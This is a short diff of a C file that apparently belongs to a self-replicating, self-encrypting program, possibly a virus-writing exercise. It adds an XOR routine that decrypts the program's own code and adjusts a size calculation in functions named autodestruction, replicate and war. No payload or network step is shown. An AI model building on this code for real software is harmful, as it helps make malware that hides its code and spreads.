@@ -1,6 +1,16 @@
 #include <war.h>
 
 ////////////////////////////////////////////////////////////////////////////////
+/// STATIC FUNCTION
+////////////////////////////////////////////////////////////////////////////////
+
+__attribute__((always_inline)) static inline void decrypt_left(const struct s_keychain *keychain, char *callee, const size_t size)
+{
+	for (register size_t index = 0; index < size; index++)
+		callee[index] ^= keychain->key[LEFT];
+}
+
+////////////////////////////////////////////////////////////////////////////////
 /// PUBLIC FUNCTION
 ////////////////////////////////////////////////////////////////////////////////
 
@@ -9,7 +19,7 @@ void autodestruction(struct s_host *host, struct s_keychain *keychain, enum e_co
 	decrypt_left(keychain, (char *)replicate, (void *)autodestruction - (void *)replicate);
 
 	char *entry;
-	const size_t size = (void *)autodestruction - (void *)war;
+	const size_t size = (void *)replicate - (void *)war;
 	char buf[size];
 
 	entry = (char *)war;
